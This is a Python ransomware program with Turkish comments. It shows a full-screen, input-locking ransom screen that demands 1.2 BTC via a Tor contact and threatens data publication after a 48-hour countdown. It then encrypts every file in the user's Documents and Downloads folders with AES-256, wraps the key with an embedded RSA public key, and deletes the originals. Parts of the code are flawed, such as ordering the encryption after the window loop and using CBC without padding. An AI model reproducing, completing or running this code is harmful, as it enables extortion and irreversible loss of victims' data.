import os
import secrets
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import ttk
import time
from pathlib import Path
from cryptography.hazmat.primitives.serialization import load_pem_public_key


TOTAL_TIME = 48 * 60 *60
BACKGROUND_COLOR = "#0D0D0D" # Koyu Siyah
ACCENT_COLOR = "#D90000"    # Koyu Kırmızı (Tehlike)
TEXT_COLOR = "#EEEEEE"      # Beyazımsı Gri
TIMER_COLOR = "#00FF00"     # Parlak Yeşil



class ProgressApp:

    def __init__(self, root):
        self.root = root
        self.root.title("ACCESS DENIED: CONTACT FOR DECRYPTION KEY")
        self.root.geometry(f"{self.root.winfo_screenwidth()}x{self.root.winfo_screenheight()}")

        self.main_frame = tk.Frame(root, bg=BACKGROUND_COLOR)
        self.main_frame.pack(expand=True, fill="both", padx=50, pady=50)


        self.label_title = tk.Label(
            self.main_frame,
            text="You are allotted 48 HOURS",
            font=("Arial", 20, "bold"),
            bg=BACKGROUND_COLOR,
            fg=ACCENT_COLOR

        )
        self.label_title.pack(pady=(35, 10))
        #- -----------------------------------------------#
        self.start_time = time.time()
        self.time_label = tk.Label(
            self.main_frame,
            text="",
            font=("Consolas", 14),
            bg=BACKGROUND_COLOR,
            fg=ACCENT_COLOR
        )
        self.time_label.pack(side="bottom", pady=10)

        # ----------------------------------------------|##
        self.expire = tk.Label(
            self.main_frame,
            text="",
            font=("Consolas", 12),
            bg=BACKGROUND_COLOR,
            fg=ACCENT_COLOR
        )
        self.expire.pack(side="bottom", pady=10)

        # ----------------------------------------------|##

        self.label = tk.Label(
            self.main_frame,
            text="This is not a system error. It is an active breach. All critical data across your corporate network and associated backups has been encrypted using RSA-4096 cryptography. Your business continuity has been terminated.\nAttempts by your technical staff to decrypt the files will fail. The keys are held exclusively on our secure, offline server. You have no alternatives for recovery.",
            font=("Arial", 16),
            bg=BACKGROUND_COLOR,
            fg=TEXT_COLOR,
            justify="center",
            wraplength=800
        )
        self.label.pack(expand=True)
        #----------------------------------------------------------|#
        instructions_text = f"""
        PAYMENT DETAILS:
        1. Amount: 1.2 BTC (Initial Rate)
        2. Wallet Address: 1CORP-RESCUE-NOW-XXX
        3. Your Unique ID: BSN-8F2D-A3C9-E1B4

        Contact us via Tor (http://datarescue.onion/corporate) with your ID and Transaction Hash.
        FAILURE TO COMPLY within the time limit will result in a 50% penalty and data publication.
        """
        self.label_instructions = tk.Label(
            self.main_frame,
            text=instructions_text,
            font=("Consolas", 14),
            bg=BACKGROUND_COLOR,
            fg=TEXT_COLOR,
            justify="left",
            wraplength=800

        )
        self.label_instructions.pack(pady=10, anchor='center')




        #-------------------------------------------------------------------|#
        # --------------------------------------------#
        self.progress = ttk.Progressbar(
            self.main_frame,
            length=300,
            mode="determinate")
        self.progress.pack(pady=(0, 10))

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TProgressbar", troughcolor="#2e2e2e", background="#00ff99", thickness=20)



        self.update_clock()
        self.update_progress()


    def update_clock(self):
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        self.time_label.config(text=current_time)
        self.root.after(1000, self.update_clock)

    def update_progress(self):
        elapsed = time.time() - self.start_time
        remaining = TOTAL_TIME - elapsed

        if remaining < 0:
            remaining = 0

        percent = ((TOTAL_TIME -remaining) / TOTAL_TIME) * 100
        self.progress["value"] = percent

        hrs = int(remaining //3600)
        mins = int((remaining % 3600) // 60)
        secs = int(remaining % 60)
        self.expire.config(
            text=f"Remaining Time: {hrs:02d}:{mins:02d}:{secs:02d}",
            font=("Arial", 16),
            bg="#1e1e1e",
            fg="#ffffff"
        )
        if remaining >0:
            self.root.after(1000, self.update_progress)
        else:
            self.expire.config(text="TIME EXPIRED")





def disable_event():
    return "break"

def ignore_all_keys(event):
    return "break"

def prevent_focus_loss(event):
    root.focus_force()
    return "break"

root = tk.Tk()
app = ProgressApp(root)
root.overrideredirect(True)

try:
    root.attributes("-fullscreen", True)
except Exception:
    root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", disable_event)

for sequence in ("<Alt-F4>", "<Escape>", "<Control-q>", "<Control-Q>"):
    root.bind_all(sequence, lambda e: "break")

root.bind_all("<Key>", ignore_all_keys)

root.bind_all("<Button>", lambda e: "break")
root.bind_all("<Button-1>", lambda e: "break")
root.bind_all("<Button-2>", lambda e: "break")
root.bind_all("<Button-3>", lambda e: "break")

root.bind("<FocusOut>", prevent_focus_loss)

# ---------- İçerik: tam ekran gösterilecek şey ----------
frame = tk.Frame(root)
frame.pack(expand=True, fill="both")




try:
    root.grab_set()
    root.grab_release()
except Exception:
    pass

root.focus_force()
root.mainloop()



# For whatever OS, this finds the full path of all folders. Change this with, Desktop, Documents, .mdb,.sql,$DBF$
folders_path = [
    str(os.path.join(Path.home(), "Documents")),
    str(os.path.join(Path.home(), "Downloads"))
]



file_key = secrets.token_bytes(32) # dosyaları sifrelemek için kullanılacak sımetrık AES-256
public_key_bytes = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr6mXDTXMeBfznyezQOq/
0iOPZCq160eMU7UspQbVF+KK8pisSfJxQhXP33E2xYmW0JGwQ9HWTJJAqiaLBdpU
8ibL18CcPBuKSZewOnBhN2DyfXng+Q3aPOLtJSvx/jL4LkfHN82CyR7A/Kmn/ysL
7Ag8yQeOBmtx+I1UbWar3vy/6VPMKnH/S2/VdgvGudxF68cM88cISX02r49nXL0n
R0kT4LmlnGrUIS1HaE1QfVwOf6h+ruPjInkJYPDe4yWz9rG+ZaqfJDryeaT1SU/D
HGqGSymJ39qWCPgOoOEX7aXYrJcaM/iZgWxB6TzyeIHXb76zNE/PgNwqJzM1Wm2E
h9OF1Aj+PSI45mpTGpFr4OnI7j93XkcxFXUGzO4NUDq1gfh2lHHZxl6Nwri9XH7J
HO/vZFGwFbEaSfqzkTNWYXgLMEgCvg4quZt4Zt3okSocN5F20IjM8+LVaUIf7Vtw
bg90pNi06xBeMGjwSN/NuGs6AMuINIwNOpxDZC9pufROwSRtv3bIgAFjWcfnuwpQ
n7Or07uMTAAoX53qyeihzfD1zqrIlWRiwztY/BiKdcOKgsT62Dd1MpElNQ1zyUic
/ZdSIaB9CixsWDJRLyP5gwN3aSGy5yqeiVEpC5fX15pjIi8MEpllWqoG6VbJI0Ya
WQcBuaJJ3fvl9hgj6b8SFwcCAwEAAQ==
-----END PUBLIC KEY-----""".encode('utf-8') # RSA public key

rsa_public_key = load_pem_public_key(public_key_bytes)

encrypted_file_key = rsa_public_key.encrypt(file_key, # file_keyı sifreliyoruz kı gerı donus olmasın
padding.OAEP(
mgf=padding.MGF1(algorithm=hashes.SHA256()),
algorithm=hashes.SHA256(),
label=None
))
ENCRYPTED_KEY_SIZE = len(encrypted_file_key)

# her bir dosya için faarklı IV kullan

def encrypt_file():
    for folder in folders_path:
        for file in os.listdir(folder):
            bufferSize = 128*1024
            filePath = os.path.join(folder, file)
            if not file.endswith(".aes"):
                iv = os.urandom(16) # ıv yı kaydetmemeiz lazim
                cipher = Cipher(algorithms.AES(file_key), modes.CBC(iv), backend=default_backend())
                encryptor = cipher.encryptor()

                destination_path= os.path.join(folder , file+".aes")
                with open(filePath, "rb") as input_file:
                    with open(destination_path, "wb") as output_file:
                        output_file.write(encrypted_file_key)
                        output_file.write(iv)

                        while True:
                            chunk = input_file.read(bufferSize)
                            if not chunk:
                                break
                            encrypted_chunk = encryptor.update(chunk)
                            output_file.write(encrypted_chunk)
                        output_file.write(encryptor.finalize())

                os.remove(filePath)


if __name__ == "__main__":
    encrypt_file()

